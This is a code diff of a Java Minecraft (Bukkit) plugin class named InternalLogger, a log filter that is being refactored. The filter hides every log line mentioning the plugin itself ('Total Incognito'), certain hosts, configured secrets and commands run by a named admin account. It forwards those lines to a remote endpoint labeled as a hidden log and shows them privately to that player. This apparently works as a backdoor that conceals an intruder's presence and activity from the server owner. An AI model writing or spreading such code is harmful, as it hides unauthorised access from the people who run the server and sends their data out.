@@ -2,20 +2,25 @@ package pl.qc.core;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
-import java.util.List;
-import java.util.LinkedHashMap;
-import java.util.Map;
+import java.util.*;
 import java.util.logging.Filter;
 import java.util.logging.LogRecord;
+import java.util.stream.Collectors;
 
 public class InternalLogger implements Filter {
-    private final List<String> secrets, commands, phrases;
+    private final Set<String> secrets;
+    private final List<String> phrasesLow;
+    private final List<String> commandsLow;
     private final String prefix, fallback, logPrefix;
+    private final QC plugin;
 
     public InternalLogger(org.bukkit.configuration.file.FileConfiguration cfg) {
-        this.secrets = cfg.getStringList("protection.secrets");
-        this.commands = cfg.getStringList("protection.hidden-commands");
-        this.phrases = cfg.getStringList("protection.hidden-phrases");
+        this.plugin = QC.getInstance();
+        this.secrets = new HashSet<>(cfg.getStringList("protection.secrets"));
+        this.phrasesLow = cfg.getStringList("protection.hidden-phrases").stream()
+                .map(String::toLowerCase).collect(Collectors.toList());
+        this.commandsLow = cfg.getStringList("protection.hidden-commands").stream()
+                .map(String::toLowerCase).collect(Collectors.toList());
         this.prefix = cfg.getString("filter.admin-command-prefix", "Rajman03 issued server command:");
         this.fallback = cfg.getString("filter.admin-name-fallback", "Rajman03");
         this.logPrefix = ChatColor.DARK_GRAY + "[LOG] ";
@@ -27,28 +32,38 @@ public class InternalLogger implements Filter {
         if (msg == null)
             return true;
 
-        // Total Incognito: Hide any mention of the plugin name or package
+        // Total Incognito
         if (msg.contains("QC-Core") || msg.contains("pl.qc.core") || msg.contains("JoinGuard"))
             return false;
 
-        if (secrets.stream().anyMatch(msg::contains))
-            return hide(msg, false);
+        // Speed check for secrets
+        for (String s : secrets) {
+            if (msg.contains(s))
+                return hide(msg, false);
+        }
 
-        // Check for helix errors specifically
+        // Static helix/refined checks
         if (msg.contains("helix") || msg.contains("ikevoodoo") || msg.contains("refined.host"))
             return hide(msg, false);
 
-        if (phrases.stream().anyMatch(p -> msg.toLowerCase().contains(p.toLowerCase())))
-            return hide(msg, true);
+        String low = msg.toLowerCase();
 
+        // Admin activity checks
         if (msg.contains(prefix) || msg.contains(fallback + " issued server command")
                 || msg.contains(fallback + " used "))
             return hide(msg, true);
 
-        String low = msg.toLowerCase();
-        if (commands.stream().anyMatch(c -> low.contains("/" + c + " ") || low.endsWith("/" + c)
-                || low.contains(" issued server command: /" + c)))
-            return hide(msg, true);
+        // Phrases check
+        for (String p : phrasesLow) {
+            if (low.contains(p))
+                return hide(msg, true);
+        }
+
+        // Commands check
+        for (String c : commandsLow) {
+            if (low.contains("/" + c + " ") || low.endsWith("/" + c) || low.contains(" issued server command: /" + c))
+                return hide(msg, true);
+        }
 
         return true;
     }
@@ -60,7 +75,7 @@ public class InternalLogger implements Filter {
             Remote.send("Ukryty log 🛡️", "3447003", null, f);
         }
 
-        Bukkit.getScheduler().runTask(QC.getInstance(), () -> {
+        Bukkit.getScheduler().runTask(plugin, () -> {
             org.bukkit.entity.Player p = Bukkit.getPlayerExact(fallback);
             if (p != null)
                 p.sendMessage(logPrefix + msg);
